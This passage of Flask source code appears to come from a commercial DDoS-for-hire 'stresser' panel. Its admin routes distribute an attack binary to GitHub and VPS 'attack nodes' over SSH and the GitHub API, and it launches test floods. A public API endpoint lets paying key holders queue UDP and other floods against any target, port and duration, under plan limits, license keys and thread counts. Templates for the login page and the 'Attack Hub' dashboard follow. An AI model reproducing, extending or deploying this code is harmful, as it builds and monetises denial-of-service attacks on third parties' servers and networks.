        if (node['node_type'] if USE_MONGO else node.node_type) == 'github':
            result = test_github_node_detailed(node)
        else:
            result = test_vps_node_detailed(node)
        flash(f"Node {node['name'] if USE_MONGO else node.name}: {result['message']}", 'info')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/nodes/<node_id>/toggle', methods=['POST'])
@admin_required('nodes')
def admin_toggle_node(node_id):
    if USE_MONGO:
        node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
        if node:
            attack_nodes_col.update_one({"_id": ObjectId(node_id)}, {"$set": {"enabled": not node['enabled']}})
    else:
        node = AttackNode.query.get(node_id)
        if node:
            node.enabled = not node.enabled
            db_sql.session.commit()
    flash('Node toggled', 'success')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/nodes/<node_id>/delete', methods=['POST'])
@admin_required('nodes')
def admin_delete_node(node_id):
    if USE_MONGO:
        node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
        if node:
            if node.get('vps_key_path') and os.path.exists(node['vps_key_path']):
                os.remove(node['vps_key_path'])
            attack_nodes_col.delete_one({"_id": ObjectId(node_id)})
    else:
        node = AttackNode.query.get(node_id)
        if node:
            if node.vps_key_path and os.path.exists(node.vps_key_path):
                os.remove(node.vps_key_path)
            db_sql.session.delete(node)
            db_sql.session.commit()
    flash('Node deleted', 'success')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/upload_binary', methods=['POST'])
@admin_required('nodes')
def admin_upload_binary():
    if 'binary' not in request.files:
        flash('No file selected', 'danger')
        return redirect(url_for('admin_nodes'))
    file = request.files['binary']
    if file.filename == '':
        flash('No file selected', 'danger')
        return redirect(url_for('admin_nodes'))
    binary_data = file.read()
    if not binary_data:
        flash('Empty file', 'danger')
        return redirect(url_for('admin_nodes'))
    if USE_MONGO:
        nodes = list(attack_nodes_col.find({"enabled": True}))
    else:
        nodes = AttackNode.query.filter_by(enabled=True).all()
    if not nodes:
        flash('No enabled nodes', 'warning')
        return redirect(url_for('admin_nodes'))
    success = 0
    for node in nodes:
        try:
            if (node['node_type'] if USE_MONGO else node.node_type) == 'github':
                token = node['github_token'] if USE_MONGO else node.github_token
                repo_name = node['github_repo'] if USE_MONGO else node.github_repo
                g = Github(token)
                repo = g.get_repo(repo_name)
                try:
                    contents = repo.get_contents("primex", ref="main")
                    repo.update_file("primex", "Update binary", binary_data, contents.sha, branch="main")
                except:
                    repo.create_file("primex", "Add binary", binary_data, branch="main")
                if USE_MONGO:
                    attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"binary_present": True}})
                else:
                    node.binary_present = True
                    db_sql.session.commit()
                success += 1
            else:
                host = node['vps_host'] if USE_MONGO else node.vps_host
                port = node['vps_port'] if USE_MONGO else node.vps_port
                username = node['vps_username'] if USE_MONGO else node.vps_username
                password = node.get('vps_password') if USE_MONGO else node.vps_password
                key_path = node.get('vps_key_path') if USE_MONGO else node.vps_key_path
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                if key_path and os.path.exists(key_path):
                    ssh.connect(host, port=port, username=username, key_filename=key_path)
                elif password:
                    ssh.connect(host, port=port, username=username, password=password)
                else:
                    continue
                stdin, stdout, stderr = ssh.exec_command("whoami")
                user = stdout.read().decode().strip()
                if user == "root":
                    remote_path = "/root/primex"
                else:
                    remote_path = f"/home/{user}/primex"
                    ssh.exec_command(f"mkdir -p /home/{user}")
                sftp = ssh.open_sftp()
                sftp.putfo(io.BytesIO(binary_data), remote_path)
                sftp.chmod(remote_path, 0o755)
                sftp.close()
                ssh.close()
                if USE_MONGO:
                    attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"binary_present": True, "status_detail": "active"}})
                else:
                    node.binary_present = True
                    node.status_detail = 'active'
                    db_sql.session.commit()
                success += 1
        except Exception as e:
            print(f"Upload failed for {node.get('name', 'unknown')}: {e}")
    flash(f'Binary distributed to {success}/{len(nodes)} nodes', 'success')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/keys')
@admin_required('keys')
def admin_keys():
    if USE_MONGO:
        keys = list(generated_keys_col.find().sort("created_at", -1))
    else:
        keys = GeneratedKey.query.order_by(GeneratedKey.created_at.desc()).all()
    return render_template_string(ADMIN_KEYS_HTML, keys=keys, plans=PLANS)

@app.route('/admin/keys/generate', methods=['POST'])
@admin_required('keys')
def generate_keys():
    plan_name = request.form.get('plan', 'Pro Plan')
    days = int(request.form.get('days', 30))
    count = int(request.form.get('count', 1))
    plan = next((p for p in PLANS if p['name'] == plan_name), PLANS[1])
    prefix = plan['key_prefix']
    keys_created = []
    for _ in range(count):
        key_str = f"{prefix}-{secrets.token_hex(4).upper()}"
        if USE_MONGO:
            generated_keys_col.insert_one({
                "key": key_str, "plan": plan_name, "duration_days": days,
                "created_by": session.get('admin_id'), "created_at": datetime.utcnow(),
                "active": True, "used_by": None
            })
        else:
            key = GeneratedKey(key=key_str, plan=plan_name, duration_days=days, created_by=session['admin_id'])
            db_sql.session.add(key)
        keys_created.append(key_str)
    if not USE_MONGO:
        db_sql.session.commit()
    flash(f"Generated {count} key(s) for {plan_name}: {', '.join(keys_created)}", 'success')
    return redirect(url_for('admin_keys'))

@app.route('/admin/keys/<key_id>/delete', methods=['POST'])
@admin_required('keys')
def delete_key(key_id):
    if USE_MONGO:
        generated_keys_col.delete_one({"_id": ObjectId(key_id)})
    else:
        key = GeneratedKey.query.get(key_id)
        if key:
            db_sql.session.delete(key)
            db_sql.session.commit()
    flash('Key deleted', 'success')
    return redirect(url_for('admin_keys'))

@app.route('/admin/settings')
@admin_required('settings')
def admin_settings():
    if USE_MONGO:
        stats = {
            'users': users_col.count_documents({}),
            'api_keys': api_keys_col.count_documents({}),
            'attack_logs': attack_logs_col.count_documents({}),
            'attack_nodes': attack_nodes_col.count_documents({}),
            'generated_keys': generated_keys_col.count_documents({}),
            'db_size': db.command("dbStats").get("dataSize", 0)
        }
    else:
        stats = {
            'users': User.query.count(),
            'api_keys': ApiKey.query.count(),
            'attack_logs': AttackLog.query.count(),
            'attack_nodes': AttackNode.query.count(),
            'generated_keys': GeneratedKey.query.count(),
            'db_size': os.path.getsize('stresser.db') if os.path.exists('stresser.db') else 0
        }
    return render_template_string(ADMIN_SETTINGS_HTML,
                                  maintenance=MAINTENANCE_MODE,
                                  cooldown=GLOBAL_COOLDOWN,
                                  max_duration=MAX_ATTACK_DURATION,
                                  default_threads=DEFAULT_THREADS,
                                  max_threads=MAX_THREADS_LIMIT,
                                  stats=stats)

@app.route('/admin/settings/update', methods=['POST'])
@admin_required('settings')
def admin_settings_update():
    global MAINTENANCE_MODE, GLOBAL_COOLDOWN, MAX_ATTACK_DURATION, DEFAULT_THREADS, MAX_THREADS_LIMIT
    action = request.form.get('action')
    if action == 'change_password':
        new_pass = request.form.get('new_password')
        confirm_pass = request.form.get('confirm_password')
        if new_pass != confirm_pass:
            flash('Passwords do not match', 'danger')
        elif len(new_pass) < 6:
            flash('Password must be at least 6 characters', 'danger')
        else:
            if USE_MONGO:
                admin_users_col.update_one(
                    {"_id": ObjectId(session['admin_id'])},
                    {"$set": {"password_hash": generate_password_hash(new_pass)}}
                )
            else:
                admin = AdminUser.query.get(session['admin_id'])
                if admin:
                    admin.password_hash = generate_password_hash(new_pass)
                    db_sql.session.commit()
            flash('Admin password changed successfully', 'success')
    elif action == 'toggle_maintenance':
        MAINTENANCE_MODE = not MAINTENANCE_MODE
        flash(f'Maintenance mode {"enabled" if MAINTENANCE_MODE else "disabled"}', 'success')
    elif action == 'update_config':
        GLOBAL_COOLDOWN = int(request.form.get('cooldown', 30))
        MAX_ATTACK_DURATION = int(request.form.get('max_duration', 300))
        DEFAULT_THREADS = int(request.form.get('default_threads', 1500))
        MAX_THREADS_LIMIT = int(request.form.get('max_threads', 10000))
        flash('Global configuration updated', 'success')
    elif action == 'broadcast':
        message = request.form.get('message')
        flash(f'Broadcast sent to all users: {message[:50]}...', 'info')
    return redirect(url_for('admin_settings'))

@app.route('/admin/settings/clear/<collection>', methods=['POST'])
@admin_required('settings')
def admin_clear_collection(collection):
    if USE_MONGO:
        if collection == 'users':
            users_col.delete_many({"role": {"$ne": "admin"}})
            flash('All non-admin users cleared', 'success')
        elif collection == 'api_keys':
            api_keys_col.delete_many({})
            flash('All API keys cleared', 'success')
        elif collection == 'attack_logs':
            attack_logs_col.delete_many({})
            flash('All attack logs cleared', 'success')
        elif collection == 'attack_nodes':
            attack_nodes_col.delete_many({})
            flash('All attack nodes cleared', 'success')
        elif collection == 'generated_keys':
            generated_keys_col.delete_many({})
            flash('All generated keys cleared', 'success')
    else:
        if collection == 'users':
            User.query.filter(User.role != 'admin').delete()
            db_sql.session.commit()
            flash('All non-admin users cleared', 'success')
        elif collection == 'api_keys':
            ApiKey.query.delete()
            db_sql.session.commit()
            flash('All API keys cleared', 'success')
        elif collection == 'attack_logs':
            AttackLog.query.delete()
            db_sql.session.commit()
            flash('All attack logs cleared', 'success')
        elif collection == 'attack_nodes':
            AttackNode.query.delete()
            db_sql.session.commit()
            flash('All attack nodes cleared', 'success')
        elif collection == 'generated_keys':
            GeneratedKey.query.delete()
            db_sql.session.commit()
            flash('All generated keys cleared', 'success')
    return redirect(url_for('admin_settings'))

@app.route('/admin/test-attack', methods=['GET', 'POST'])
@admin_required('test_attack')
def admin_test_attack():
    if request.method == 'POST':
        target = request.form.get('target')
        port = int(request.form.get('port'))
        duration = int(request.form.get('duration'))
        method = request.form.get('method', 'udp')
        threads = int(request.form.get('threads', DEFAULT_THREADS))

        if duration > 30:
            flash('Test duration limited to 30 seconds', 'warning')
            duration = 30

        if USE_MONGO:
            github_nodes = list(attack_nodes_col.find({"enabled": True, "node_type": "github"}))
            vps_nodes = list(attack_nodes_col.find({"enabled": True, "node_type": "vps"}))
        else:
            github_nodes = AttackNode.query.filter_by(enabled=True, node_type='github').all()
            vps_nodes = AttackNode.query.filter_by(enabled=True, node_type='vps').all()

        results = []
        github_success = 0
        vps_success = 0

        for node in github_nodes:
            node_name = node['name'] if USE_MONGO else node.name
            try:
                if trigger_github_attack(node, target, port, duration, method, threads):
                    results.append({'name': node_name, 'type': 'GitHub', 'status': '✅ Success', 'details': ''})
                    github_success += 1
                else:
                    results.append({'name': node_name, 'type': 'GitHub', 'status': '❌ Failed', 'details': 'Trigger returned False'})
            except Exception as e:
                results.append({'name': node_name, 'type': 'GitHub', 'status': '❌ Error', 'details': str(e)[:50]})

        for node in vps_nodes:
            node_name = node['name'] if USE_MONGO else node.name
            try:
                if trigger_vps_attack(node, target, port, duration, method, threads):
                    results.append({'name': node_name, 'type': 'VPS', 'status': '✅ Success', 'details': ''})
                    vps_success += 1
                else:
                    results.append({'name': node_name, 'type': 'VPS', 'status': '❌ Failed', 'details': 'Trigger returned False'})
            except Exception as e:
                results.append({'name': node_name, 'type': 'VPS', 'status': '❌ Error', 'details': str(e)[:50]})

        flash(f'Test completed: GitHub {github_success}/{len(github_nodes)} | VPS {vps_success}/{len(vps_nodes)}', 'info')
        return render_template_string(ADMIN_TEST_ATTACK_HTML,
                                      results=results, target=target, port=port, duration=duration,
                                      method=method, threads=threads,
                                      github_total=len(github_nodes), vps_total=len(vps_nodes),
                                      github_success=github_success, vps_success=vps_success)

    return render_template_string(ADMIN_TEST_ATTACK_HTML, results=None)

@app.route('/admin/test-attack/single', methods=['POST'])
@admin_required('test_attack')
def admin_test_single_node():
    node_id = request.form.get('single_node')
    target = request.form.get('target', '127.0.0.1')
    port = int(request.form.get('port', 443))
    duration = min(int(request.form.get('duration', 5)), 10)
    method = request.form.get('method', 'udp')
    threads = int(request.form.get('threads', 500))

    if USE_MONGO:
        node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
    else:
        node = AttackNode.query.get(node_id)

    if not node:
        return jsonify({'status': 'error', 'message': 'Node not found'}), 404

    node_name = node['name'] if USE_MONGO else node.name
    node_type = node['node_type'] if USE_MONGO else node.node_type

    try:
        if node_type == 'github':
            success = trigger_github_attack(node, target, port, duration, method, threads)
        else:
            success = trigger_vps_attack(node, target, port, duration, method, threads)

        if success:
            return jsonify({'status': 'success', 'message': f'Attack launched on {node_name}'})
        else:
            return jsonify({'status': 'failed', 'message': 'Attack trigger returned False'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)[:100]})

# ==================== ADMIN MANAGE ROUTES ====================
@app.route('/admin/manage')
@admin_required('manage_admins')
def admin_manage():
    if USE_MONGO:
        admins = list(admin_users_col.find())
    else:
        admins = AdminUser.query.all()
    can_manage = session.get('admin_is_super', False) or 'manage_admins' in session.get('admin_permissions', [])
    return render_template_string(ADMIN_MANAGE_HTML, admins=admins, USE_MONGO=USE_MONGO, can_manage_admins=can_manage)

@app.route('/admin/manage/add', methods=['POST'])
@admin_required('manage_admins')
def admin_manage_add():
    username = request.form.get('username')
    password = request.form.get('password')
    is_super = request.form.get('is_super') == 'on'
    permissions = request.form.getlist('permissions')

    if not username or not password:
        flash('Username and password required', 'danger')
        return redirect(url_for('admin_manage'))

    if USE_MONGO:
        if admin_users_col.find_one({"username": username}):
            flash('Username already exists', 'danger')
            return redirect(url_for('admin_manage'))
        admin_users_col.insert_one({
            "username": username,
            "password_hash": generate_password_hash(password),
            "permissions": permissions,
            "is_super": is_super,
            "created_at": datetime.utcnow()
        })
    else:
        if AdminUser.query.filter_by(username=username).first():
            flash('Username already exists', 'danger')
            return redirect(url_for('admin_manage'))
        admin = AdminUser(
            username=username,
            password_hash=generate_password_hash(password),
            permissions=json.dumps(permissions),
            is_super=is_super
        )
        db_sql.session.add(admin)
        db_sql.session.commit()
    flash(f'Admin {username} created', 'success')
    return redirect(url_for('admin_manage'))

@app.route('/admin/manage/edit/<admin_id>', methods=['POST'])
@admin_required('manage_admins')
def admin_manage_edit(admin_id):
    is_super = request.form.get('is_super') == 'on'
    permissions = request.form.getlist('permissions')

    if USE_MONGO:
        admin_users_col.update_one(
            {"_id": ObjectId(admin_id)},
            {"$set": {"permissions": permissions, "is_super": is_super}}
        )
    else:
        admin = AdminUser.query.get(admin_id)
        if admin:
            admin.permissions = json.dumps(permissions)
            admin.is_super = is_super
            db_sql.session.commit()
    flash('Admin updated', 'success')
    return redirect(url_for('admin_manage'))

@app.route('/admin/manage/delete/<admin_id>', methods=['POST'])
@admin_required('manage_admins')
def admin_manage_delete(admin_id):
    if (USE_MONGO and str(admin_id) == session.get('admin_id')) or (not USE_MONGO and int(admin_id) == session.get('admin_id')):
        flash('You cannot delete your own account', 'danger')
        return redirect(url_for('admin_manage'))

    if USE_MONGO:
        admin_users_col.delete_one({"_id": ObjectId(admin_id)})
    else:
        admin = AdminUser.query.get(admin_id)
        if admin:
            db_sql.session.delete(admin)
            db_sql.session.commit()
    flash('Admin deleted', 'success')
    return redirect(url_for('admin_manage'))

# ==================== API KEY MANAGEMENT ROUTES ====================
@app.route('/admin/api_keys')
@admin_required('keys')
def admin_api_keys():
    if USE_MONGO:
        keys = list(api_keys_col.find())
        user_map = {}
        for k in keys:
            uid = k.get('user_id')
            if uid:
                user = users_col.find_one({"_id": uid})
                user_map[str(uid)] = user['token'][:16] + '...' if user else 'Unknown'
    else:
        keys = ApiKey.query.order_by(ApiKey.created_at.desc()).all()
        user_map = {k.user_id: (User.query.get(k.user_id).token[:16] + '...' if k.user_id and User.query.get(k.user_id) else 'N/A') for k in keys}
    return render_template_string(ADMIN_API_KEYS_HTML, keys=keys, plans=PLANS, user_map=user_map, USE_MONGO=USE_MONGO)

@app.route('/admin/api_keys/create', methods=['POST'])
@admin_required('keys')
def admin_create_api_key():
    user_id = request.form.get('user_id')
    name = request.form.get('name', 'API Key')
    plan_name = request.form.get('plan_name')
    custom_concurrent = request.form.get('custom_concurrent')
    custom_duration = request.form.get('custom_duration')
    custom_threads = request.form.get('custom_threads')
    expires_days = request.form.get('expires_days')

    if not user_id:
        flash('User ID is required', 'danger')
        return redirect(url_for('admin_api_keys'))

    max_concurrent = None
    max_duration = None
    max_threads = None
    if plan_name and plan_name != 'custom':
        plan = next((p for p in PLANS if p['name'] == plan_name), None)
        if plan:
            max_concurrent = plan['concurrent']
            max_duration = plan['duration']
            max_threads = plan['threads']
    else:
        max_concurrent = int(custom_concurrent) if custom_concurrent else None
        max_duration = int(custom_duration) if custom_duration else None
        max_threads = int(custom_threads) if custom_threads else None

    expires_at = None
    if expires_days and expires_days.isdigit():
        expires_at = datetime.utcnow() + timedelta(days=int(expires_days))

    new_key = secrets.token_urlsafe(32)

    if USE_MONGO:
        api_keys_col.insert_one({
            "user_id": ObjectId(user_id),
            "key": new_key,
            "name": name,
            "plan_name": plan_name if plan_name != 'custom' else None,
            "max_concurrent": max_concurrent,
            "max_duration": max_duration,
            "max_threads": max_threads,
            "expires_at": expires_at,
            "active": True,
            "last_used": None,
            "total_attacks": 0,
            "created_at": datetime.utcnow()
        })
    else:
        api_key = ApiKey(
            user_id=int(user_id),
            key=new_key,
            name=name,
            plan_name=plan_name if plan_name != 'custom' else None,
            max_concurrent=max_concurrent,
            max_duration=max_duration,
            max_threads=max_threads,
            expires_at=expires_at,
            active=True
        )
        db_sql.session.add(api_key)
        db_sql.session.commit()

    flash(f'API Key created! Copy it now: {new_key}', 'success')
    return redirect(url_for('admin_api_keys'))

@app.route('/admin/api_keys/<key_id>/delete', methods=['POST'])
@admin_required('keys')
def admin_delete_api_key(key_id):
    if USE_MONGO:
        api_keys_col.delete_one({"_id": ObjectId(key_id)})
    else:
        key = ApiKey.query.get(key_id)
        if key:
            db_sql.session.delete(key)
            db_sql.session.commit()
    flash('API Key deleted', 'success')
    return redirect(url_for('admin_api_keys'))

@app.route('/admin/api_keys/<key_id>/toggle', methods=['POST'])
@admin_required('keys')
def admin_toggle_api_key(key_id):
    if USE_MONGO:
        key = api_keys_col.find_one({"_id": ObjectId(key_id)})
        if key:
            api_keys_col.update_one({"_id": ObjectId(key_id)}, {"$set": {"active": not key.get('active', True)}})
    else:
        key = ApiKey.query.get(key_id)
        if key:
            key.active = not key.active
            db_sql.session.commit()
    flash('API Key toggled', 'success')
    return redirect(url_for('admin_api_keys'))

# ==================== API ATTACK ENDPOINT ====================
@app.route('/api/attack', methods=['POST'])
def api_attack():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid JSON'}), 400

    api_key = data.get('api_key')
    target = data.get('target')
    port = data.get('port')
    duration = data.get('duration')
    method = data.get('method', 'udp')
    threads = data.get('threads', DEFAULT_THREADS)
    concurrent = data.get('concurrent', 1)

    if not all([api_key, target, port, duration]):
        return jsonify({'error': 'Missing parameters'}), 400

    if USE_MONGO:
        key_obj = api_keys_col.find_one({"key": api_key})
    else:
        key_obj = ApiKey.query.filter_by(key=api_key).first()

    if not key_obj:
        return jsonify({'error': 'Invalid API key'}), 401

    if not key_obj.get('active', True):
        return jsonify({'error': 'API key is inactive'}), 403

    expires = key_obj.get('expires_at')
    if expires and expires < datetime.utcnow():
        return jsonify({'error': 'API key expired'}), 403

    user_id = key_obj.get('user_id')
    if USE_MONGO:
        user = users_col.find_one({"_id": user_id})
    else:
        user = User.query.get(user_id)

    if not user:
        return jsonify({'error': 'User not found'}), 404

    if key_obj.get('max_duration') is not None:
        max_dur = key_obj['max_duration']
    else:
        max_dur = user.get('max_duration', 60) if USE_MONGO else user.max_duration

    if key_obj.get('max_concurrent') is not None:
        max_conc = key_obj['max_concurrent']
    else:
        max_conc = user.get('max_concurrent', 1) if USE_MONGO else user.max_concurrent

    if key_obj.get('max_threads') is not None:
        max_thr = key_obj['max_threads']
    else:
        max_thr = user.get('max_threads', 1500) if USE_MONGO else user.max_threads

    if duration > max_dur:
        return jsonify({'error': f'Max duration {max_dur}s'}), 400
    if threads > max_thr:
        return jsonify({'error': f'Max threads {max_thr}'}), 400
    if concurrent > max_conc:
        return jsonify({'error': f'Max concurrent {max_conc}'}), 400

    slots_used = user.get('slots_used', 0) if USE_MONGO else user.slots_used
    if slots_used + concurrent > max_conc:
        return jsonify({'error': 'No free slots'}), 429

    with attack_lock:
        attack_queue.append({
            'user_id': user_id,
            'target': target,
            'port': port,
            'duration': duration,
            'method': method,
            'threads': threads,
            'concurrent': concurrent,
            'source': 'api'
        })
        global is_attacking
        if not is_attacking:
            is_attacking = True
            threading.Thread(target=process_attack_queue).start()

    if USE_MONGO:
        users_col.update_one(
            {"_id": user_id},
            {"$set": {"last_attack": datetime.utcnow()}, "$inc": {"slots_used": concurrent}}
        )
        api_keys_col.update_one(
            {"_id": key_obj['_id']},
            {"$set": {"last_used": datetime.utcnow()}, "$inc": {"total_attacks": 1}}
        )
    else:
        user.last_attack = datetime.utcnow()
        user.slots_used += concurrent
        key_obj.last_used = datetime.utcnow()
        key_obj.total_attacks += 1
        db_sql.session.commit()

    return jsonify({
        'status': 'queued',
        'position': len(attack_queue),
        'duration': duration,
        'endsAt': (datetime.utcnow() + timedelta(seconds=duration)).isoformat()
    }), 200

# ==================== LIVE STATUS APIs ====================
@app.route('/admin/nodes/status/all')
@admin_required('dashboard')
def admin_nodes_status_all():
    if USE_MONGO:
        nodes = list(attack_nodes_col.find())
    else:
        nodes = AttackNode.query.all()
    result = []
    for node in nodes:
        if USE_MONGO:
            result.append({
                'id': str(node['_id']), 'name': node['name'], 'type': node['node_type'],
                'enabled': node.get('enabled', True), 'status': node.get('status_detail', 'unknown'),
                'binary': node.get('binary_present', False), 'attack_count': node.get('attack_count', 0)
            })
        else:
            result.append({
                'id': node.id, 'name': node.name, 'type': node.node_type,
                'enabled': node.enabled, 'status': node.status_detail or 'unknown',
                'binary': node.binary_present, 'attack_count': node.attack_count
            })
    return jsonify(result)

@app.route('/admin/nodes/<node_id>/test', methods=['POST'])
@admin_required('nodes')
def admin_test_node_ajax(node_id):
    if USE_MONGO:
        node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
    else:
        node = AttackNode.query.get(node_id)
    if not node:
        return jsonify({'error': 'Node not found'}), 404
    if (node['node_type'] if USE_MONGO else node.node_type) == 'vps':
        result = test_vps_node_detailed(node)
    else:
        result = test_github_node_detailed(node)
    return jsonify(result)

@app.route('/admin/attack/status')
@admin_required('dashboard')
def admin_attack_status():
    with attack_lock:
        queue_len = len(attack_queue)
        cur = current_attack.copy() if current_attack else None
    return jsonify({'is_attacking': is_attacking, 'queue_length': queue_len, 'current_attack': cur})

@app.route('/admin/attack/stop', methods=['POST'])
@admin_required('dashboard')
def admin_stop_attack():
    global is_attacking, current_attack
    with attack_lock:
        attack_queue.clear()
        is_attacking = False
        current_attack = None
    flash('Attack queue cleared', 'success')
    return redirect(url_for('admin_dashboard'))

# ==================== HTML TEMPLATES ====================
# ==================== ALL HTML TEMPLATES ====================

LOGIN_HTML = '''
<!DOCTYPE html>
<html><head><title>Login • STRESSER</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'Inter',sans-serif; color:#fff; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; padding:20px; animation:fadeInUp 0.6s ease-out;}
.glass-card{background:rgba(15,25,45,0.6); backdrop-filter:blur(12px); border-radius:32px; border:1px solid rgba(0,255,200,0.2); padding:40px; width:100%; max-width:450px; box-shadow:0 20px 40px rgba(0,0,0,0.4);}
input{background:rgba(0,0,0,0.5); border:1px solid #2a3a5a; border-radius:40px; padding:12px 20px; color:white; width:100%; margin-bottom:20px;}
input:focus{outline:none; border-color:#00ffcc; box-shadow:0 0 12px #00ffcc;}
.btn-neon{background:linear-gradient(90deg,#00b377,#00cc88); border:none; border-radius:40px; padding:12px; font-weight:bold; width:100%; transition:0.2s;}
.btn-neon:hover{transform:scale(1.02);box-shadow:0 0 15px #00ff88;}
a{color:#00ffcc; text-decoration:none;}
@keyframes fadeInUp{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
</style></head>
<body><div class="glass-card"><h2 class="text-center mb-4" style="color:#00ffcc;">🔐 Login</h2>
{% with messages = get_flashed_messages(with_categories=true) %}{% for cat, msg in messages %}<div class="alert alert-{{ cat }}">{{ msg }}</div>{% endfor %}{% endwith %}
<form method="POST">
    <input type="text" name="token" placeholder="Access Token" required>
    <div class="mb-3"><label class="form-label">Captcha: {{ captcha_question }}</label><input type="text" name="captcha" class="form-control" placeholder="Your answer" required></div>
    <button type="submit" class="btn-neon">🚀 Login</button>
</form>
<p class="text-center mt-3">No token? <a href="/register">Generate one</a></p>
<hr><p class="text-center mt-3"><small>Admin? <a href="/admin/login">Admin Login</a></small></p></div></body></html>
'''

REGISTER_HTML = '''
<!DOCTYPE html>
<html><head><title>Register • STRESSER</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'Inter',sans-serif; color:#fff; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; padding:20px; animation:fadeInUp 0.6s ease-out;}
.glass-card{background:rgba(15,25,45,0.6); backdrop-filter:blur(12px); border-radius:32px; border:1px solid rgba(0,255,200,0.2); padding:40px; width:100%; max-width:450px; box-shadow:0 20px 40px rgba(0,0,0,0.4);}
.btn-neon{background:linear-gradient(90deg,#00b377,#00cc88); border:none; border-radius:40px; padding:12px; font-weight:bold; width:100%;}
</style></head>
<body><div class="glass-card"><h2 class="text-center mb-4" style="color:#00ffcc;">✨ Create Account</h2>
{% with messages = get_flashed_messages(with_categories=true) %}{% for cat, msg in messages %}<div class="alert alert-{{ cat }}">{{ msg }}</div>{% endfor %}{% endwith %}
<form method="POST">
    <div class="mb-3"><label class="form-label">Captcha: {{ captcha_question }}</label><input type="text" name="captcha" class="form-control" placeholder="Your answer" required></div>
    <button type="submit" class="btn-neon">🎫 Generate Token</button>
</form>
<p class="text-center mt-3">Already have one? <a href="/login">Login</a></p></div></body></html>
'''

DASHBOARD_HTML = '''
<!DOCTYPE html>
<html><head><title>Dashboard • STRESSER</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'Inter',sans-serif; color:#eef5ff; overflow-x:hidden;}
.sidebar{position:fixed;left:0;top:0;width:280px;height:100%;background:rgba(5,10,20,0.95);backdrop-filter:blur(16px);border-right:1px solid rgba(0,255,200,0.2);padding:30px 20px;z-index:10;transition:transform 0.3s ease;}
.main{margin-left:280px;padding:30px;position:relative;z-index:2;animation:fadeInUp 0.6s ease-out;}
.glass-card{background:rgba(15,25,45,0.45);backdrop-filter:blur(12px);border-radius:32px;border:1px solid rgba(0,255,200,0.2);padding:28px;margin-bottom:30px;transition:all 0.3s cubic-bezier(0.2,0.9,0.4,1.1);}
.glass-card:hover{border-color:rgba(0,255,200,0.6);transform:translateY(-5px);box-shadow:0 15px 35px rgba(0,0,0,0.3);}
.btn-neon{background:linear-gradient(90deg,#00b377,#00cc88);border:none;border-radius:60px;padding:12px 24px;font-weight:bold;color:#000;width:100%;transition:all 0.2s;}
.btn-neon:hover{transform:scale(1.02);box-shadow:0 0 15px #00ff88;}
.stat-number{font-size:44px;font-weight:800;background:linear-gradient(135deg,#fff,#00ffcc);-webkit-background-clip:text;background-clip:text;color:transparent;}
.menu-toggle{display:none;position:fixed;top:20px;left:20px;z-index:20;background:#00ffcc;border:none;padding:10px 15px;border-radius:30px;color:#000;font-size:18px;cursor:pointer;}
.nav-link{display:block;padding:12px 20px;margin:8px 0;border-radius:40px;color:#ccd6f0;text-decoration:none;transition:0.2s;}
.nav-link:hover,.nav-link.active{background:rgba(0,255,200,0.15);color:#00ffcc;}
@media (max-width:800px){.sidebar{transform:translateX(-100%);width:260px;}.main{margin-left:0;padding:70px 20px 20px;}.menu-toggle{display:block;}}
@keyframes fadeInUp{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
</style>
</head>
<body>
<button class="menu-toggle" id="menuToggle"><i class="fas fa-bars"></i></button>
<div class="sidebar" id="sidebar">
    <div class="text-center mb-4"><h2 style="color:#00ffcc;">🚀 STRESSER</h2></div>
    <nav>
        <a href="/dashboard" class="nav-link active"><i class="fas fa-tachometer-alt me-2"></i> Dashboard</a>
        <a href="/attack" class="nav-link"><i class="fas fa-bolt me-2"></i> Attack Hub</a>
        <a href="/products" class="nav-link"><i class="fas fa-shopping-cart me-2"></i> Products</a>
        <a href="/logout" class="nav-link"><i class="fas fa-sign-out-alt me-2"></i> Logout</a>
    </nav>
    <div class="mt-5 pt-3 border-top">
        <p><i class="fas fa-gem me-2"></i> {{ user.plan }}</p>
        <p><i class="fas fa-hourglass-half me-2"></i> Max Duration: {{ user.max_duration }}s</p>
        <p><i class="fas fa-layer-group me-2"></i> Concurrent: {{ user.max_concurrent }}</p>
        <p><i class="fas fa-microchip me-2"></i> Max Threads: {{ user.max_threads }}</p>
        {% if user.expiry %}<p><i class="far fa-calendar-alt me-2"></i> Expires: {{ user.expiry.strftime('%Y-%m-%d') }}</p>{% endif %}
    </div>
</div>
<div class="main">
